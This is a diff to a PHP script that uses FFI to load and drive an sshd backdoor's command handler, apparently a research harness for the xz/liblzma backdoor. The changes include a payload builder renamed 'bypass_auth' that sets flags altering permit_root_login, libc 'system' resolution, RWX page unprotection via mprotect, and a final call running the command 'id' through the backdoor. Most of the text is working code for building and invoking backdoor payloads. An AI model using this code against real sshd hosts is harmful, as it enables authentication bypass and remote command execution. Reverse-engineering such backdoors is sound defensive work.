@@ -15,6 +15,26 @@ use phpseclib3\Math\BigInteger;
 require_once __DIR__ . '/vendor/autoload.php';
 require_once __DIR__ . '/common.php';
 
+define('O_ACCMODE',  00000003);
+define('O_RDONLY',  00000000);
+define('O_WRONLY',  00000001);
+define('O_RDWR',  00000002);
+define('O_CREAT',  00000100);        /* not fcntl */
+define('O_EXCL',  00000200);        /* not fcntl */
+define('O_NOCTTY',  00000400);        /* not fcntl */
+define('O_TRUNC',  00001000);        /* not fcntl */
+define('O_APPEND',  00002000);
+define('O_NONBLOCK',  00004000);
+define('O_SYNC',  00010000);
+define('FASYNC',  00020000);        /* fcntl, for BSD compatibility */
+define('O_DIRECT',  00040000);        /* direct disk access hint */
+define('O_LARGEFILE',  00100000);
+define('O_DIRECTORY',  00200000);        /* must be a directory */
+define('O_NOFOLLOW',  00400000);        /* don't follow links */
+define('O_NOATIME',  01000000);
+define('O_CLOEXEC',  02000000);        /* set close_on_exec */
+define('O_NDELAY',  O_NONBLOCK);
+
 class Invoker {
     private FFI $ffi;
     private FFI $crypto;
@@ -43,9 +63,13 @@ class Invoker {
         );
 
         $this->syms = FFI::cdef('
+            typedef unsigned int mode_t;
+
             void *dlsym(void *handle, const char *symbol);
             int mprotect(void *addr, size_t len, int prot);
             int getpagesize(void);
+            int open(const char *pathname, int flags, mode_t mode);
+            int close(int fd);
             '
         );
     }
@@ -73,6 +97,16 @@ class Invoker {
     private CData $nat_host_pubkeys;
     private CData $nat_sshkey;
     private CData $nat_sshkey_pub;
+
+    private CData $nat_STR_ssh_rsa_cert_v01_openssh_com;
+    private CData $nat_STR_rsa_sha2_256;
+    private CData $nat_monitor_ptr;
+    private CData $nat_monitor_data;
+
+    private $fd_ssh_out;
+    private $fd_ssh_in;
+    private $fd_ssh_log_out;
+    private $fd_ssh_log_in;
 
     private function init_structures_part0(){
         $ffi = $this->ffi;
@@ -107,22 +141,59 @@ class Invoker {
             return 0;
         };
 
+        $this->nat_STR_ssh_rsa_cert_v01_openssh_com = make_bytearray("ssh-rsa-cert-v01@openssh.com\x00");
+        $this->nat_STR_rsa_sha2_256 = make_bytearray("rsa-sha2-256\x00");
+
+        $this->nat_ctx->STR_ssh_rsa_cert_v01_openssh_com = FFI::cast('char *', FFI::addr($this->nat_STR_ssh_rsa_cert_v01_openssh_com));
+        $this->nat_ctx->STR_rsa_sha2_256 = FFI::cast('char *', FFI::addr($this->nat_STR_rsa_sha2_256));
+
         $this->nat_ctx->num_shifted_bits = ED448_PUBKEY_SIZE * 8;
         $this->nat_ctx->imported_funcs = FFI::addr($this->nat_imported_funcs);
         $this->nat_ctx->libc_imports = FFI::addr($this->nat_libc_imports);
         $this->nat_ctx->sshd_log_ctx = FFI::addr($this->nat_sshd_log_ctx);
         $this->nat_ctx->sshd_ctx = FFI::addr($this->nat_sshd_ctx);
+        
+        $this->nat_monitor_ptr = make_array(8);
+        $this->nat_monitor_data = $ffi->new('struct monitor');
+        writeptr(FFI::addr($this->nat_monitor_ptr), FFI::addr($this->nat_monitor_data));
+
+        /** @var mixed */
+        $syms = $this->syms;
+        $this->fd_ssh_out = $syms->open('ssh_out.bin', O_CREAT|O_RDWR|O_TRUNC, 0666);
+        $this->fd_ssh_in = $syms->open('ssh_in.bin', O_CREAT|O_RDWR|O_TRUNC, 0666);
+        $this->fd_ssh_log_out = $syms->open('ssh_out_log.bin', O_CREAT|O_RDWR|O_TRUNC, 0666);
+        $this->fd_ssh_log_in = $syms->open('ssh_in_log.bin', O_CREAT|O_RDWR|O_TRUNC, 0666);
+
+        /*
+        $this->nat_monitor_data->m_recvfd = 1;
+        $this->nat_monitor_data->m_sendfd = 0;
+        
+        $this->nat_monitor_data->m_log_recvfd = 1;
+        $this->nat_monitor_data->m_log_sendfd = 0;
+        */
+        $this->nat_monitor_data->m_recvfd = $this->fd_ssh_out;
+        $this->nat_monitor_data->m_sendfd = $this->fd_ssh_in;
+        $this->nat_monitor_data->m_log_recvfd = $this->fd_ssh_log_out;
+        $this->nat_monitor_data->m_log_sendfd = $this->fd_ssh_log_in;
+        
+        $this->nat_monitor_data->m_pkex = NULL;
+        $this->nat_monitor_data->m_pid = getmypid();
+        $this->nat_monitor_ptr = FFI::new('void *[1]');
+        $this->nat_monitor_ptr[0] = FFI::addr($this->nat_monitor_data);
+
+        $this->nat_ctx->struct_monitor_ptr_address = FFI::cast('void *', FFI::addr($this->nat_monitor_ptr));
 
         
         /** init imported functions */
-        foreach(['RSA_get0_key', 'RSA_set0_key', 'RSA_sign',
-        'BN_bn2bin', 'BN_num_bits', 'EVP_CIPHER_CTX_new',
-        'EVP_DecryptInit_ex', 'EVP_DecryptUpdate',
-        'EVP_DecryptFinal_ex', 'EVP_CIPHER_CTX_free',
-        'EVP_chacha20', 'RSA_new', 'RSA_free', 'BN_dup', 'BN_bin2bn', 'BN_free',
-        'EVP_Digest', 'EVP_sha256', 'EVP_PKEY_new_raw_public_key',
-        'EVP_MD_CTX_new', 'EVP_DigestVerifyInit', 'EVP_DigestVerify',
-        'EVP_MD_CTX_free', 'EVP_PKEY_free'
+        foreach(['RSA_public_decrypt', 'EVP_PKEY_set1_RSA', 
+        'DSA_get0_pqg', 'DSA_get0_pub_key',
+        'EC_POINT_point2oct', 'EC_KEY_get0_public_key',
+        'EC_KEY_get0_group', 'EVP_sha256', 'RSA_get0_key', 'BN_num_bits',
+        'EVP_PKEY_new_raw_public_key', 'EVP_MD_CTX_new', 'EVP_DigestVerifyInit',
+        'EVP_DigestVerify', 'EVP_MD_CTX_free', 'EVP_PKEY_free', 'EVP_CIPHER_CTX_new',
+        'EVP_DecryptInit_ex', 'EVP_DecryptUpdate', 'EVP_DecryptFinal_ex', 'EVP_CIPHER_CTX_free',
+        'EVP_chacha20', 'RSA_new', 'BN_dup', 'BN_bin2bn', 'RSA_set0_key',
+        'EVP_Digest', 'RSA_sign', 'BN_bn2bin', 'RSA_free', 'BN_free'
         ] as $fn){
             $addr = $this->dlsym($fn);
             if($addr == null) throw new RuntimeException();
@@ -132,7 +203,7 @@ class Invoker {
         foreach([
             'getuid', 'exit', 'malloc_usable_size',
             'setresuid', 'setresgid', 'system', 'pselect', 'setlogmask',
-            '__errno_location'
+            '__errno_location', 'write', 'read', 'shutdown', '__libc_stack_end'
         ] as $fn){
             $addr = $this->dlsym($fn);
             if($addr == null) throw new RuntimeException();
@@ -287,10 +358,10 @@ class Invoker {
         );
     }
 
-    private function payload_make_type3(){
+    private function payload_make_bypass_auth(){
         $cmd_type = 3;
         $packet = (''
-            . $this->payload_make_args(0, 0x4, 0, 0)
+            . $this->payload_make_args(0, 0x4, 0x20, 0)
             . str_repeat("\x00", 0x30)
         );
         return $this->payload_make($cmd_type, $packet);
@@ -355,8 +426,8 @@ class Invoker {
         $this->nat_RSA_free($payload_rsa_key);
     }
 
-    public function cmd_type3(){
-        $payload = $this->payload_make_type3();
+    public function cmd_bypass_auth(){
+        $payload = $this->payload_make_bypass_auth();
         say("permit_root_login: {$this->nat_permit_root_login->cdata}");
         $this->backdoor_invoke($payload);
         say("permit_root_login: {$this->nat_permit_root_login->cdata}");
@@ -375,17 +446,24 @@ class Invoker {
         $this->backdoor_invoke($payload);
     }
 
-    private function nat_unprotect_page(CData $addr){
+    private function getpagesize(){
+        /** @var mixed */
+        $ffi = $this->syms;
+        $pagesz = $ffi->getpagesize();
+        return $pagesz;
+    }
+
+    private function nat_unprotect(CData $addr, int $size){
         /** @var mixed */
         $ffi = $this->syms;
 
         $pagesz = $ffi->getpagesize();
-        $pagemask = $pagesz - 1;
+		$size = align_up($size, $pagesz);
     
         $val = FFI::cast('uintptr_t', $addr);
-        $val->cdata = $val->cdata & ~$pagemask;
+        $val->cdata = align_down($val->cdata, $pagesz);
         $ptr = FFI::cast('void *', $val);
-        $ret = $ffi->mprotect($ptr, $pagesz, 7);
+        return $ffi->mprotect($ptr, $size, 7);
     }
 
     public function debug_place_breakpoints(int ...$addrs){
@@ -393,7 +471,7 @@ class Invoker {
         $ffi = $this->ffi;
         $ptr1 = $ffi->run_backdoor_commands;
 
-        $this->nat_unprotect_page($ffi->run_backdoor_commands);
+        $this->nat_unprotect($ffi->run_backdoor_commands, $this->getpagesize());
     
         $code = "\xeb\xfe\x90\x90";
         FFI::memcpy($ptr1, $code, strlen($code));
@@ -402,12 +480,13 @@ class Invoker {
         $base = 0x9490;
 
         $inspect_sigcheck = <<<'EOS'
-        b verify_signature
-        commands
-        x/50xb $rsi
-        printf "payload_body_size: %u\n", $rdx
-        printf "signed_data_size: %u\n", $rcx
-        end
+        # b verify_signature
+        # commands
+        # x/50xb $rsi
+        # printf "payload_body_size: %u\n", $rdx
+        # printf "signed_data_size: %u\n", $rcx
+        # end
+        b sshd_get_client_socket
         
         EOS;
 
@@ -506,4 +585,5 @@ $invoker->cmd_patch_sshd();
 print(" done!\n");
 */
 
-$invoker->cmd_type3();
+$invoker->cmd_system('id');
+//$invoker->cmd_bypass_auth();
